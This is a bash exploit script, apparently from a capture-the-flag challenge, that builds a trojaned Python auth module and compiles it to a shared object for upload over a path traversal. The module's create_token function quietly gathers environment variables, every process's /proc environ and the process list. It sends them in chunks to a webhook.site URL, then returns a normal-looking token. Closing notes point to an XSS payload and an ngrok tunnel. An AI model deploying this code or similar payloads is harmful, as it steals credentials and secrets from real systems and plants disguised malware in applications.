#!/bin/bash
# create_auth_so_complete.sh

CONTAINER_ID="3f532bdb974f"
WEBHOOK="https://webhook.site/1738ce87-4a08-47ae-9cd5-323dc449cb7d"

echo "[*] =========================================="
echo "[*] Creating auth.so with full payload"
echo "[*] =========================================="

# Step 1: Create auth.py
cat > auth.py << 'EOFPYTHON'
def create_token(user_id):
    """Capture everything when bot runs"""
    import os
    import glob
    import urllib.request
    import urllib.parse
    import json
    import time
    
    WEBHOOK = "https://webhook.site/1738ce87-4a08-47ae-9cd5-323dc449cb7d"
    
    def send_webhook(data, title="data"):
        try:
            payload = json.dumps({"title": title, "data": data[:8000]}).encode()
            req = urllib.request.Request(WEBHOOK, data=payload, headers={'Content-Type': 'application/json'})
            urllib.request.urlopen(req, timeout=10)
        except:
            pass
        
        try:
            encoded = urllib.parse.quote(data[:2000])
            urllib.request.urlopen(f"{WEBHOOK}?{title}={encoded}", timeout=10)
        except:
            pass
    
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    send_webhook(f"Bot execution at {timestamp}", "timestamp")
    
    # Current environment
    current_env = "\n".join([f"{k}={v}" for k, v in os.environ.items()])
    send_webhook(current_env, "current_env")
    
    with open('/app/uploads/CURRENT_ENV.txt', 'w') as f:
        f.write(current_env)
    
    # All /proc/*/environ
    all_procs = []
    for env_file in sorted(glob.glob("/proc/[0-9]*/environ")):
        try:
            pid = env_file.split('/')[2]
            with open(env_file, 'rb') as f:
                content = f.read().decode('utf-8', errors='ignore')
            formatted = content.replace('\x00', '\n')
            all_procs.append(f"\n=== PID {pid} ===\n{formatted}\n")
        except:
            pass
    
    all_procs_str = ''.join(all_procs)
    
    with open('/app/uploads/ALL_PROCS.txt', 'w') as f:
        f.write(all_procs_str)
    
    # Send in chunks
    for i in range(0, len(all_procs_str), 3000):
        chunk = all_procs_str[i:i+3000]
        send_webhook(chunk, f"procs_{i//3000+1}")
    
    # Search for FLAG
    import re
    flag_pattern = re.compile(r'0xL4ugh\{[^}]+\}')
    combined = current_env + "\n" + all_procs_str
    flags = flag_pattern.findall(combined)
    
    if flags:
        for flag in flags:
            send_webhook(flag, "FLAG_FOUND")
            with open('/app/uploads/FLAG.txt', 'w') as f:
                f.write(flag)
    else:
        send_webhook("No flag found", "no_flag")
    
    # Process list
    try:
        import subprocess
        ps_output = subprocess.check_output(['ps', 'aux'], text=True)
        send_webhook(ps_output, "ps_aux")
    except:
        pass
    
    with open('/app/uploads/SUCCESS.txt', 'w') as f:
        f.write(f"Executed at {timestamp}\n")
    
    send_webhook("Complete", "status")
    
    import secrets
    return secrets.token_urlsafe(32)
EOFPYTHON

echo "[+] Created auth.py"

# Step 2: Create setup.py
cat > setup.py << 'EOFSETUP'
from setuptools import setup, Extension
from Cython.Build import cythonize

setup(
    name='auth',
    ext_modules=cythonize(
        "auth.py",
        compiler_directives={'language_level': "3"}
    ),
)
EOFSETUP

echo "[+] Created setup.py"

# Step 3: Copy to container
echo "[*] Copying files to container..."
docker cp auth.py ${CONTAINER_ID}:/tmp/
docker cp setup.py ${CONTAINER_ID}:/tmp/

# Step 4: Install build dependencies
echo "[*] Installing build dependencies..."
docker exec ${CONTAINER_ID} bash -c '
apt-get update -qq > /dev/null 2>&1
apt-get install -y gcc python3-dev -qq > /dev/null 2>&1
pip install cython setuptools wheel -q
'

# Step 5: Build with setup.py
echo "[*] Building with setup.py..."
docker exec ${CONTAINER_ID} bash -c '
cd /tmp
python3 setup.py build_ext --inplace 2>&1 | tail -5
ls -la auth*.so 2>/dev/null || echo "Build failed"
'

# Step 6: Check and copy
SO_FILE=$(docker exec ${CONTAINER_ID} bash -c "ls /tmp/auth*.so 2>/dev/null | head -1")

if [ -n "$SO_FILE" ]; then
    echo "[+] Found .so file: $SO_FILE"
    
    # Rename and copy
    docker exec ${CONTAINER_ID} bash -c "cp $SO_FILE /tmp/auth.so"
    docker cp ${CONTAINER_ID}:/tmp/auth.so ./auth.so
    
    if [ -f auth.so ]; then
        SIZE=$(stat -c%s auth.so 2>/dev/null || stat -f%z auth.so)
        echo "[+] Successfully created auth.so ($SIZE bytes)"
        ls -lh auth.so
        
        FILE_TYPE="auth.so"
        UPLOAD_PATH="../../../app/utils/auth.so"
    else
        echo "[-] Failed to copy auth.so"
        exit 1
    fi
else
    echo "[*] Setup.py failed, trying direct cythonize..."
    
    docker exec ${CONTAINER_ID} bash -c '
    cd /tmp
    cythonize -i -3 auth.py 2>&1 | tail -3
    ls -la auth*.so
    '
    
    SO_FILE=$(docker exec ${CONTAINER_ID} bash -c "ls /tmp/auth*.so 2>/dev/null | head -1")
    
    if [ -n "$SO_FILE" ]; then
        echo "[+] Cythonize succeeded: $SO_FILE"
        docker exec ${CONTAINER_ID} bash -c "cp $SO_FILE /tmp/auth.so"
        docker cp ${CONTAINER_ID}:/tmp/auth.so ./auth.so
        
        SIZE=$(stat -c%s auth.so 2>/dev/null || stat -f%z auth.so)
        echo "[+] Created auth.so ($SIZE bytes)"
        
        FILE_TYPE="auth.so"
        UPLOAD_PATH="../../../app/utils/auth.so"
    else
        echo "[!] Cannot create .so, using .py file"
        
        FILE_TYPE="auth.py"
        UPLOAD_PATH="../../../app/utils/auth.py"
    fi
fi

# Step 7: Test
echo ""
echo "[*] Testing payload..."
docker exec ${CONTAINER_ID} python3 -c "
import sys
sys.path.insert(0, '/tmp')
try:
    import auth
    token = auth.create_token('test')
    print(f'[+] Test successful: {token[:20]}...')
except Exception as e:
    print(f'[-] Test failed: {e}')
"

# Check if files were created
echo ""
echo "[*] Checking output files..."
docker exec ${CONTAINER_ID} ls -la /app/uploads/*.txt 2>/dev/null

echo ""
echo "[*] =========================================="
echo "[+] Build complete!"
echo "[*] =========================================="
echo ""
echo "File created: $FILE_TYPE"
echo "Upload path: $UPLOAD_PATH"
echo ""
echo "Next steps:"
echo "  1. python3 -m http.server 8000"
echo "  2. ngrok http 8000"
echo "  3. Update XSS payload with: $UPLOAD_PATH"
echo "  4. python3 payload.py"
echo ""
echo "Monitor results:"
echo "  - Webhook: https://webhook.site/#!/1738ce87-4a08-47ae-9cd5-323dc449cb7d"
echo "  - Files: curl http://localhost:81/uploads/FLAG.txt"
echo ""

# Cleanup
rm -f setup.py